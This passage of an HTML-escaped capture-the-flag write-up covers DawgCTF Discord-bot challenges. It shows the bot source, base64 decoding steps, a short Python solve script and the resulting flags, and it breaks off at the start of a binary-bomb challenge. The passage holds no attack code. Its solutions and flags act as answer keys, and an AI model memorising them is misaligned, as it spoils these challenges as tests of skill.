&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Yo&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;yo&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;await &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;channel&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(blist[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(mlist[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;70&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(klist[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;112&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;BOT_ID&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;blist&lt;&#x2F;code&gt; has the longest base64 string which got my eyes again. Saved the blist string in &lt;code&gt;base.txt&lt;&#x2F;code&gt;. And Decoded it from &lt;code&gt;base64&lt;&#x2F;code&gt; multiple times.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;dmbot1$&lt;&#x2F;span&gt;&lt;span&gt; cat base.txt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gsgdhEFEGfdegrFFgsgdhrgd
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgseeGFGgsgdhFs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gsgdhEFEGfdegrFFgsgdhrgd
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;degrFFgsgdhrgdeeGFGggdhr
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dhEFEGfsgdhFswFDEdggwFDE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgseeGFGgsgdhFs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gsgdhEFEGfdegrFFgsgdhrgd
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gsgdhrgdeeGFGgsgdhFswFDE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgdhgsgdhFswFDE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGeeGFGgsgdhFswFDE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgdhEFEGfdegrFF
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DawgCTF{L34RN_T0_D3PL0Y&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgdhEFEGGFGgsgd
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgdhGsgdhFswFDE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rgdeeGFGgsgseeGFGgsgdhFs
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gsgdhEFEGfdegrFFgsgdhrgd
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;degrFFgsgdhrgdeeGFGggdhr
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dhEFEGfsgdhFswFDEdggwFDE
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fdegrFFgsgdhrgdeeGFGgEFE
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{L34RN_T0_D3PL0Y}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;dm-bot-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#dm-bot-1&quot; aria-label=&quot;Anchor link for: dm-bot-1&quot;&gt;DM Bot?&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_dmbot2.png&quot; alt=&quot;DM2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;1s-aiDz8D0gtYTt5GpjNoWH0dcHNPL6to&quot; target=_blank&gt;bot.py&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;bot.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#BY: J4NU5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;discord
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;STRING &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span&gt;START &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22
&lt;&#x2F;span&gt;&lt;span&gt;STOP &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;58
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    client &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;discord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Client&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;intents&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;discord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Intents&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;event
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;async def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;on_ready&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;We have logged in as &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;{0.user}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(client))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    msglist &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFkaX&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Bpc2NpbmcgZWxpdCwgc2VkIGRvIGVpdXNtb2QgdGVtcG9yIGluY2lkaWR1bnQgdXQgbGFib3JlIGV0IGRvbG9yZSBtYWduYSBhbGlxdWEuIFVybmEgY29uZGltZW50dW0gbWF0dGlzIHBlbGxlbnRlc3F1ZSBpZCBuaWJoIHRvcnRvciBpZCBhbGlxdWV0LiBGYW==&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;NpbGlzaXMgbWFnbmEgZXRpYW0gdGVtcG9yIG9yY2kgZXUuIFNhcGllbiBldCBsaWd1bGEgdWxsYW1jb3JwZXIgbWFsZXN1YWRhLiBUcmlzdGlxdWUgbnVsbGE&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;gYWxpcXVldCBlbmltIHRvcnRvciBhdC4gUXVpcyByaXN1cyBzZWQgdnVscHV0YXRlIG9kaW8uIFNhZ2l0dGlzIGFsaXF1YW0gbWFsZXN1YWRhIGJpYmVuZHVt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;IGFyY3Ugdml0YWUgZWxlbWRGF3Z0NURns1dDR0MWNfMHJfZHluNG0xYz99VudHVtIGN1cmFiaXR1ci4gSGFiaXRhc3NlIHBsYXRlYSBkaWN0dW1zdCBxdW=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;lzcXVlIHNhZ2l0dGlzIHB1cnVzIHNpdCBhbWV0LiBQdXJ1cyBncmF2aWRhIHF1aXMgYmxhbmRpdCB0dXJwaXMgY3Vyc3VzIGluIGhhYyBoYWJpdGFzc2UuIFZvbHV0cGF0IGFjIHRpbmNpZHVudCB2aXRhZSBzZW1wZXIuIFF1YW0gZWxlbWVudHVtIHB1b==&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HZpbmFyIGV0aWFtIG5vbiBxdWFtIGxhY3VzLiBBbWV0IHRlbGx1cyBjcmFzIGFkaXBpc2NpbmcgZW5pbSBldSB0dXJwaXMgZWdlc3Rhcy4KCkZldWdpYXQgbmlzbCBwcmV0aXVtIGZ1c2NlIGlkIHZlbGl0IHV0IHRvcnRvciBwcmV0aXVtIHZpdmVycmEuIEVuaW0gZGlhbSB2dWxwdXRhdGUgdXQgcGhhcmV0cmEgc2l0IGFtZ&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;XQuIEZldWdpYXQgcHJldGl1bSBuaWJoIGlwc3VtIGNvbnNlcXVhdCBuaXNsLiBCaWJlbmR1bSB1dCB0cmlzdGlxdWUgZXQgZWdlc3RhcyBxdWlzIGlwc3VtIHN1c3BlbmRpc3NlIHVsdHJpY2VzLiBWaXZlcnJhIGlwc3VtIG51bmMgYWxpcXVldCBi&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;aWJlbmR1bSBlbmltIGZhY2lsaXNpcyBncmF2aWRhIG5lcXVlLiBDb25zZWN0ZXR1ciBhZGlwaXNjaW5nIGVsaXQgdXQgYWxpcXVhbSBwdXJ1cyBzaXQgYW1ldCBsdWN0dXMuIEVyYXQgdmVsaXQgc2NlbG&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VyaXNxdWUgaW4gZGljdHVtIG5vbiBjb25zZWN0ZXR1ciBhIGVyYXQuIERpYW0gc29sbGljaXR1ZGluIHRlbXBvciBpZCBldSBuaXNsIG51bmMgbWkgaXBzdW0uIFJpc3VzIHF1aXMgdmFyaXVzIHF1YW0gcXVpc3F1ZSBpZCBkaWFtIHZlbCBxdWFtIGV&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;sZW1lbnR1bS4gUG9zdWVyZSBsb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCBjb25zZWN0ZXR1ci4gVWxsYW1jb3JwZXIgbW9yYmkgdGluY2lkdW50IG9ybmFyZSBtYXNzYS4gUXVhbSBhZGlwaXNjaW5nIHZpdGFlIHByb2luIHNhZ2l0dGlzIG5pc2wgcmhvbmN1cy4gRXUgY29uc2VxdWF0IGFjIGZlbGlzIGRvbmVjIGV0IG9kaW8gcGVsbGVudGVzcX&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VlIGRpYW0gdm9sdXRwYXQuIEV0IG1hZ25pcyBkaXMgcGFydHVyaWVudCBtb250ZXMgbmFzY2V0dXIuIEFsaXF1YW0gbWFsZXN1YWRhIGJpYmVuZHVtIGFyY3Ugdml0YWUuIEluIG51bGxhIHBvc3VlcmUgc29sbGljaXR1ZGluIGFsaXF1YW0u&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span&gt;client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;event
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;async def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;on_message&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;message&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;author &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;user:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;hello&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Hello&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;hi&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Hi&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;await &lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;channel&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(msglist[STRING][START&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;STOP])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    client&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;THIS_SHOULD_PROBABLY_BE_A_PROPER_BOT_ID&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Again some base64 encodes! This time observed the program. The message which is sending to the user is &lt;code&gt;message.channel.send(msglist[STRING][START:STOP])&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;msglist&lt;&#x2F;code&gt; is the list given, &lt;code&gt;STRING = 4&lt;&#x2F;code&gt; &lt;code&gt;START = 22&lt;&#x2F;code&gt; &lt;code&gt;STOP = 58&lt;&#x2F;code&gt;.
So I tried to decode the string from 22 to 58th character of 4th index string list. This solve.py will print the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#msglist[4][22:58]
&lt;&#x2F;span&gt;&lt;span&gt;msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;IGFyY3Ugdml0YWUgZWxlbWRGF3Z0NURns1dDR0MWNfMHJfZHluNG0xYz99VudHVtIGN1cmFiaXR1ci4gSGFiaXRhc3NlIHBsYXRlYSBkaWN0dW1zdCBxdW&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;58&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;decoded_string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b64decode&lt;&#x2F;span&gt;&lt;span&gt;(msg)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(decoded_string)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# DawgCTF{5t4t1c_0r_dyn4m1c?}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{5t4t1c_0r_dyn4m1c?}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;binary-bomb-phase-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#binary-bomb-phase-1&quot; aria-label=&quot;Anchor link for: binary-bomb-phase-1&quot;&gt;Binary Bomb Phase 1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_binarybomb1.png&quot; alt=&quot;BB1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;18swPwtmBfTU-9-5onuzlX52JCSUJQf3F&quot; target=_blank&gt;dawg_bbomb&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I used the &lt;code&gt;ltrace&lt;&#x2F;code&gt; to execute this binary file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
